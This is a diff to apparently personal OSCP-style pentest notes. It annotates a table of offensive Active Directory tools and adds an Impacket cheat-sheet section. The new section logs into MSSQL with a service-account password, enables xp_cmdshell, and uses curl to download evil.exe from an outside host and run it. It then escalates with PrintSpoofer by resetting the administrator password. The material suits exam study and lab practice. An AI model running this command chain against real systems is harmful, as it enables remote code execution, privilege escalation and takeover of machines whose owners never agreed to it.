@@ -14,6 +14,34 @@
 | impacket-wmiexec                                                                                                                                  | provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
 | [Group3r](https://github.com/Group3r/Group3r)                                                                                                     | finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
 | impacket-raiseChild                                                                                                                               | automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
-| impacket-mssqlclient                                                                                                                              | provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| impacket-mssqlclient                                                                                                                              | provides the ability to interact with MSSQL databases. used when we have TGS of sql                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
 | Ligolo-ng                                                                                                                                         | c2 establish tunnels though reverse shell                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
 | impacket-smbserver                                                                                                                                | create an smb serve to pass files                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+
+
+### Impacket
+
+**mssqlclient**
+```sh
+
+#sql service account tgs
+
+impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth
+
+enable_xp_cmdshell
+
+#find a dir to write on
+
+xp_cmdshell dir c:\users\public\document
+
+xp_cmdshell curl http://10.10.10.10/evil.exe  -o c:\users\public\document\evil.exe 
+
+xp_cmdshell  c:\users\public\document\evil.exe 
+
+#or use printspoofer or so to basically change the admin passowrd 
+printspoofer -i -c "net user administrator password123"
+#disable wifewall enable rdp 
+evil-winrm ....
+
+
+```
